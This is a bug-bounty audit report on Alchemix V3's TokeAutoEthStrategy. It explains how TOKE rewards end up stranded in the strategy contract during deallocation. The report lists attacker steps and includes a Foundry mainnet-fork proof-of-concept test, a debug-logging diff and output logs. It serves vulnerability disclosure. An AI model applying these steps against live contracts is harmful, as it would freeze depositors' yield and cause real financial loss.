# 58362 sc low users will lose tokemak rewards earned in tokeautoethstrategy

**Submitted on Nov 1st 2025 at 15:36:32 UTC by @oxrex for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58362
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/arbitrum/AaveV3ARBUSDCStrategy.sol>
* **Impacts:**
  * Permanent freezing of unclaimed yield

## Description

## Brief/Intro

`TokeAutoEthStrategy` contract will have its TokeMak reward tokens stuck inside the strategy contract and these tokens won't be sent to the VaultV2 contract as the protocol assumed.

## Vulnerability Details

In the `_deallocate` function below, I will explain why that will be the case:

```solidity
function _deallocate(uint256 amount) internal override returns (uint256) {
        uint256 sharesNeeded = autoEth.convertToShares(amount);
        uint256 actualSharesHeld = rewarder.balanceOf(address(this));
        uint256 shareDiff = actualSharesHeld - sharesNeeded;
        if (shareDiff <= 1e18) {
            // account for vault rounding up
            sharesNeeded = actualSharesHeld;
        }
        // withdraw shares, claim any rewards
        rewarder.withdraw(address(this), sharesNeeded, true);
        uint256 wethBalanceBefore = TokenUtils.safeBalanceOf(address(weth), address(this));
        autoEth.redeem(sharesNeeded, address(this), address(this));
        uint256 wethBalanceAfter = TokenUtils.safeBalanceOf(address(weth), address(this));
        uint256 wethRedeemed = wethBalanceAfter - wethBalanceBefore;
        if (wethRedeemed < amount) {
            emit StrategyDeallocationLoss("Strategy deallocation loss.", amount, wethRedeemed);
        }
        require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than the amount needed");
        TokenUtils.safeApprove(address(weth), msg.sender, amount);
        return amount;
    }
```

In the Rewarder contract for TokeAuto vaults from the Autopilot protocol, when a user calls the `rewarder.withdraw()` function, the rewarder contract sends `autoETH` tokens to the user/caller. It also sends along accumulated TokeMak (`TOKE` token) portion of reward tokens to the same caller/user.

So, if say the strategy deposits 100 WETH and gets minted x amount of `autoETH` which then gets staked into the rewarder contract, when a user then calls `withdraw` on the rewarder contract, the rewarder contract

1. Sends `autoETH` requested by the user to the user (these `autoETH` will then be exchanged to WETH in the `redeem()` call to autoETH contract)
2. Sends accumulated unclaimed rewards (`TOKE` tokens) to the same user

This goes against the assumption of Alchemix because Alchemix assumes and needs these reward tokens to go to the VaultV2 contract this strategy is tied to, not stay inside the strategy contract. As a result, these tokens sent during that `withdraw()` call will be stuck and cannot be retrieved out of the strategy contract rendering a loss.

For an attacker to make this the case, they can:

1. Deposit a small amount of assets into the VaultV2 contract tied to this strategy contract
2. Later, these assets will be allocated to the TokeAutoETHStrategy contract along with other user deposits. Let's assume the attacker deposits 0.5 WETH or 0.1 etc and then other users deposit e.g 10 WETH, 20 WETH etc
3. After the allocation of these WETH to the strategy contract which then swaps these into `autoETH` and deposits them into the rewarder contract to earn rewards, the attacker can wait a couple hours and then unstake small amounts from their initial 0.5 WETH deposit.
4. Doing this, since the VaultV2 will have had all of its WETH allocated to the strategy, the `_deallocate` call will be triggered for each of his withdrawals and the `rewarder.withdraw()` function will be triggered which will:
5. Withdraw x amount of shares that is enough to cover x amount of user requested WETH
6. Send all accumulated `TOKE` rewards to the strategy contract instead of the VaultV2 contract

Now, the attacker will be able to aggregate all the accumulated `TOKE` rewards thus far into the strategy contract and other users who deposited large sums of WETH that were allocated to this strategy will all lose their `TOKE` portion of yield which cannot be recovered from the strategy contract.

Note: My POC above demonstrates the locked `TOKE` tokens inside the strategy contract as you can see from the logs:

```js
Logs:
  SHARES MINTED:  9729328543427726812059
  Value:  0
  Shares Needed:  9727319691056032738327
  Actual shares held:  9729328543427726812059
@>  TokeMak reward token balance of this contract during withdraw:  35146100646369824435062
```

The revert is from the AutoPool Debt external contract that the Rewarder contract interacts with during forked tests and calls chainlink for prices which is not relevant to this bug but that is the reason for the revert in the end.

Also, note the added detailed log I added to the `_deallocate()` function in the `TokeAutoEthStrategy` contract to speed up understanding of the bug:

```diff
+ interface ERC20 {
+    function balanceOf(address account) external view returns (uint256);
+ }

    address public immutable rewardToken;
+    address public constant TOKEMAK = 0x2e9d63788249371f1DFC918a52f8d799F4a38C94;

function _deallocate(uint256 amount) internal override returns (uint256) {
        uint256 sharesNeeded = autoEth.convertToShares(amount);
        console2.log("Shares Needed: ", sharesNeeded);
        uint256 actualSharesHeld = rewarder.balanceOf(address(this));
+        console2.log("Actual shares held: ", actualSharesHeld);
        uint256 shareDiff = actualSharesHeld - sharesNeeded;
        if (shareDiff <= 1e18) {
            // account for vault rounding up
            sharesNeeded = actualSharesHeld;
        }
        // withdraw shares, claim any rewards
        rewarder.withdraw(address(this), sharesNeeded, true);
        uint256 wethBalanceBefore = TokenUtils.safeBalanceOf(address(weth), address(this));
+        console2.log("TokeMak reward token balance of this contract during withdraw: ", ERC20(TOKEMAK).balanceOf(address(this)));
+        console2.log("WETH balance before: ", wethBalanceBefore);
        autoEth.redeem(sharesNeeded, address(this), address(this));
        ...
        return amount;
    }
```

## Impact Details

Complete loss of accumulated `TOKE` yield everytime the bug I described above in the vulnerability details section gets triggered. Since these reward tokens then get diverted to the strategy contract rather than the VaultV2 contract, they cannot be reclaimed.

From my POC and a 1 month yield gains duration, the locked `TOKE` tokens would be 35k TOKE which is currently valued at USD 7000 since each TOKE is worth USD 0.2.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol#L67C5-L88>

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
// Adjust these imports to your layout

import {TokeAutoEthStrategy} from "src/strategies/mainnet/TokeAutoEth.sol";
import {BaseStrategyTest} from "../libraries/BaseStrategyTest.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract MockTokeAutoEthStrategy is TokeAutoEthStrategy {
    constructor(
        address _myt,
        StrategyParams memory _params,
        address _autoEth,
        address _router,
        address _rewarder,
        address _weth,
        address _oracle,
        address _permit2Address
    ) TokeAutoEthStrategy(_myt, _params, _autoEth, _router, _rewarder, _weth, _oracle, _permit2Address) {}
}

contract TokeAutoETHStrategyTest is BaseStrategyTest {
    address public constant TOKE_AUTO_ETH_VAULT = 0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant MAINNET_PERMIT2 = 0x000000000022d473030f1dF7Fa9381e04776c7c5;
    address public constant AUTOPILOT_ROUTER = 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21;
    address public constant REWARDER = 0x60882D6f70857606Cdd37729ccCe882015d1755E;
    address public constant ORACLE = 0x61F8BE7FD721e80C0249829eaE6f0DAf21bc2CaC;
    address public constant TOKEMAK = 0x2e9d63788249371f1DFC918a52f8d799F4a38C94;

    function getStrategyConfig() internal pure override returns (IMYTStrategy.StrategyParams memory) {
        return IMYTStrategy.StrategyParams({
            owner: address(1),
            name: "TokeAutoEth",
            protocol: "TokeAutoEth",
            riskClass: IMYTStrategy.RiskClass.MEDIUM,
            cap: 10_000e18,
            globalCap: 1e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1
        });
    }

    function getTestConfig() internal pure override returns (TestConfig memory) {
        return TestConfig({vaultAsset: WETH, vaultInitialDeposit: 1000e18, absoluteCap: 10_000e18, relativeCap: 1e18, decimals: 18});
    }

    function createStrategy(address vault, IMYTStrategy.StrategyParams memory params) internal override returns (address) {
        return address(new MockTokeAutoEthStrategy(vault, params, TOKE_AUTO_ETH_VAULT, AUTOPILOT_ROUTER, REWARDER, WETH, ORACLE, MAINNET_PERMIT2));
    }

    function getForkBlockNumber() internal pure override returns (uint256) {
        return 22_089_302;
    }

    function getRpcUrl() internal view override returns (string memory) {
        return vm.envString("MAINNET_RPC_URL");
    }

    function test_strategy_allocate_reverts_and_usablePOC() public {
        uint256 amountToAllocate = 100e18;
        uint256 oneWei = 1;
        address attacker = makeAddr("attacker");

        vm.startPrank(vault);
        deal(testConfig.vaultAsset, strategy, amountToAllocate);
        deal(testConfig.vaultAsset, attacker, oneWei);
        vm.stopPrank();

        vm.prank(attacker);
        IERC20(testConfig.vaultAsset).transfer(address(strategy), oneWei);

        vm.startPrank(vault);
        bytes memory prevAllocationAmount = abi.encode(0);
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));
        vm.stopPrank();
    }

    function test_multipleDaysPOC() public {
        uint256 amountToAllocate = 10000e18;
        uint256 amountToDeallocate;

        vm.startPrank(vault);
        deal(testConfig.vaultAsset, strategy, amountToAllocate);

        bytes memory prevAllocationAmount = abi.encode(0);
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));

        amountToDeallocate = IMYTStrategy(strategy).previewAdjustedWithdraw(0.1e18);

        vm.warp(block.timestamp + 19220328);
        vm.roll(23690996);

        vm.startPrank(vault);
        bytes memory prevAllocationAmount2 = abi.encode(amountToAllocate);
        IMYTStrategy(strategy).deallocate(prevAllocationAmount2, amountToDeallocate, "", address(vault));

        vm.stopPrank();
    }
}

```
